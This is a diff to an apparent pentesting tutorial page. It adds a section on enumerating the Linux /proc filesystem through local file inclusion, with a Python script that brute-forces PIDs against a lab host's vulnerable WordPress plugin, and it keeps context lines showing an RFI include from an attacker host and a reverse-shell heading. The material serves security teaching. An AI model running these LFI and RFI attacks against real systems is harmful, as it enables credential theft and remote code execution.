@@ -2841,6 +2841,150 @@ DATA
               </ul>
               <pre><code class="language-bash">python rfiscanner.py &lt;target_url&gt;
 </code></pre>
+
+<h5 id="3317-proc-enumeration">3.3.1.7 Enumerating the /proc Filesystem</h5>
+
+<p>
+When an LFI vulnerability is present, attackers can often read sensitive system files.
+Beyond <code>/etc/passwd</code> or shell history, one of the most powerful targets is the Linux
+<code>/proc</code> filesystem. This pseudo-filesystem exposes live information about running processes,
+network connections, mounted filesystems and more.
+</p>
+
+<h6>Interesting Global /proc Entries</h6>
+
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Directory</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>/proc/sched_debug</td>
+      <td>
+        Shows which process is running on which CPU. Useful for discovering process names and PIDs.
+        (Note: this file exists only if <code>CONFIG_SCHED_DEBUG</code> is enabled in the kernel.)
+      </td>
+    </tr>
+    <tr>
+      <td>/proc/mounts</td>
+      <td>Lists mounted filesystems. Helps identify locations of config files or other targets.</td>
+    </tr>
+    <tr>
+      <td>/proc/net/arp</td>
+      <td>Shows the ARP table. Useful for discovering internal hosts.</td>
+    </tr>
+    <tr>
+      <td>/proc/net/route</td>
+      <td>Shows routing information for the system.</td>
+    </tr>
+    <tr>
+      <td>/proc/net/tcp and /proc/net/udp</td>
+      <td>Lists active network connections; can reveal listening ports and services.</td>
+    </tr>
+    <tr>
+      <td>/proc/net/fib_trie</td>
+      <td>Route caching structure. Can reveal local IPs and internal network topology.</td>
+    </tr>
+    <tr>
+      <td>/proc/version</td>
+      <td>Shows kernel version. Useful for OS fingerprinting and vulnerability assessment.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>
+These entries can greatly help fingerprint what the system is running, which services are active,
+and how the network is structured.
+</p>
+
+<h6>Per-Process /proc Entries</h6>
+
+<p>
+Every running process has its own directory: <code>/proc/[PID]/</code>.
+If you know or can guess the PID,
+you can read valuable details about the process—including command-line args, environment variables,
+open file handles, and more. Sometimes these contain credentials.
+</p>
+
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Directory</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>/proc/[PID]/cmdline</td>
+      <td>
+        Shows the full command used to start a process. Often exposes config file paths,
+        usernames, or passwords.
+      </td>
+    </tr>
+    <tr>
+      <td>/proc/[PID]/environ</td>
+      <td>
+        Shows the environment variables for the process. Sometimes includes API keys,
+        tokens, or DB credentials.
+      </td>
+    </tr>
+    <tr>
+      <td>/proc/[PID]/cwd</td>
+      <td>
+        Shows the current working directory of the process—helpful for locating config files
+        when paths are unknown.
+      </td>
+    </tr>
+    <tr>
+      <td>/proc/[PID]/fd/[#]</td>
+      <td>
+        Lists file descriptors opened by the process. Sometimes allows reading files the
+        process has open even if permissions normally wouldn't allow it.
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+<h6>Example: Enumerating Running Commands via /proc/[PID]/cmdline</h6>
+
+<p>
+Since the command line of each process is stored in <code>/proc/[PID]/cmdline</code>,
+LFI can be used to brute force PIDs and discover which service is running on an unknown port.
+</p>
+
+<p>Verify access to one PID:</p>
+<pre><code class="language-bash">
+http://target/wp-content/plugins/.../filedownload.php?ebookdownloadurl=/proc/1/cmdline
+</code></pre>
+
+<p>Brute force example (PID 1–1000):</p>
+<pre><code class="language-python">
+import requests
+
+for i in range(1, 1000):
+    url = f"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{i}/cmdline"
+    r = requests.get(url)
+    clean = r.text.replace(f"/proc/{i}/cmdline","").replace("\\x00"," ")
+    if len(clean.strip()) > 0:
+        print(f"PID {i}: {clean}")
+</code></pre>
+
+<p>Example output (revealing gdbserver running on port 1337):</p>
+<pre><code class="language-bash">
+sh -c while true; do su user -c "cd /home/user; gdbserver -once 0.0.0.0:1337 /bin/true"; done
+</code></pre>
+
+<p>
+This technique is extremely useful for discovering hidden services, credentials,
+or internal network connections exposed through LFI.
+</p>
+
+
+
+
               <h4 id="332-remote-file-inclusion-rfi">3.3.2 Remote File Inclusion (RFI)</h4>
               <p>Remote File Inclusion (RFI) allows attackers to include external files into the web server&rsquo;s
                 execution
@@ -2851,6 +2995,9 @@ DATA
               <pre><code class="language-bash"># This assumes the server&#39;s allow_url_fopen or allow_url_include settings are enabled.
 http://&lt;target_url&gt;/file.php?recurse=http://&lt;attacker_ip&gt;/malicious.php
 </code></pre>
+
+
+
               <h5 id="3322-reverse-shell-via-rfi">3.3.2.2 Reverse Shell via RFI</h5>
               <ol>
                 <li><strong>Start a Simple HTTP Server</strong>:</li>
